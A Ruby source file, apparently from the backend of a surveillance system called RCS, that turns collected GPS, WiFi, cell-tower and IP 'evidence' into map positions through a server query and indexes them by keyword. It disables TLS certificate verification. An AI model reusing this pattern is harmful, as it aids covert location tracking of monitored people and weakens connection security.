require_relative 'single_evidence'

module RCS
  module PositionProcessing
    extend SingleEvidence
    include EventMachine::Protocols
    include RCS::Tracer

    def process
      case self[:data][:type]
        when 'GPS'
          q = {map: {gpsPosition: {latitude: self[:data][:latitude], longitude: self[:data][:longitude]}}}
        when 'WIFI'
          towers = []
          self[:data][:wifi].each do |wifi|
            towers << {macAddress: wifi[:mac], signalStrength: wifi[:sig]}
          end
          q = {map: {wifiAccessPoints: towers}}
        when 'GSM'
          q = {map: {cellTowers: [
              {mobileCountryCode: self[:data][:cell][:mcc], mobileNetworkCode: self[:data][:cell][:mnc], locationAreaCode: self[:data][:cell][:lac], cellId: self[:data][:cell][:cid], signalStrength: self[:data][:cell][:db], timingAdvance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
          ], radioType: 'gsm'}}
        when 'CDMA'
          q = {map: {cellTowers: [
              {mobileCountryCode: self[:data][:cell][:mcc], mobileNetworkCode: self[:data][:cell][:sid], locationAreaCode: self[:data][:cell][:nid], cellId: self[:data][:cell][:bid], signalStrength: self[:data][:cell][:db], timingAdvance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
          ], radioType: 'cdma'}}
        when 'IPv4'
          q = {map: {ipAddress: {ipv4: self[:data][:ip]}}}
      end

      http = Net::HTTP.new(RCS::DB::Config.instance.global['CN'], RCS::DB::Config.instance.global['LISTENING_PORT'])
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE

      res = http.request_post('/position', q.to_json)
      reply = JSON.parse(res.body)

      return if reply['latitude'].nil? or reply['longitude'].nil?

      # fallback if the accuracy is ZERO
      self[:data][:accuracy] = 50 if self[:data][:type] == 'GPS' and self[:data][:accuracy] == 0
      self[:data].merge!(reply)
    end

    def keyword_index
      self[:kw] = []

      puts self[:data].inspect

      self[:kw] += self[:data]['latitude'].to_s.keywords unless self[:data]['latitude'].nil?
      self[:kw] += self[:data]['longitude'].to_s.keywords unless self[:data]['longitude'].nil?

      unless self[:data]['address'].nil?
        self[:data]['address'].each_value do |add|
          self[:kw] += add.keywords
        end
      end
      unless self[:data][:cell].nil?
        self[:data][:cell].each_value do |cell|
          self[:kw] << cell.to_s
        end
      end
      unless self[:data][:wifi].nil?
        self[:data][:wifi].each do |wifi|
          self[:kw] += [wifi[:mac].keywords, wifi[:ssid].keywords ].flatten
        end
      end

      self[:data].each_value do |value|
        next unless value.is_a? String
        self[:kw] += value.keywords
      end

      self[:kw].uniq!

      puts self[:kw].inspect

    end

    def type
      :position
    end
  end # PositionProcessing
end # DB
